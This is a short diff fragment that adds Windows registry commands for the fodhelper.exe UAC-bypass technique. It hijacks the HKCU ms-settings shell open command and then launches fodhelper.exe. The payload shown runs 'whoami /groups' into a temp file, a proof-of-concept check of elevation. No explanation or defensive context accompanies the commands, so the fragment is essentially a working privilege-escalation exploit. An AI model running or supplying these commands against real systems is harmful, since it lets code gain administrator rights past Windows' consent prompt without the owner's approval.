@@ -265,3 +265,11 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 
 fodhelper.exe
 
+reg delete HKCU\Software\Classes\ms-settings /f
+
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe /c whoami /groups > C:\Windows\Temp\uac.txt" /f
+
+
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+
+fodhelper.exe
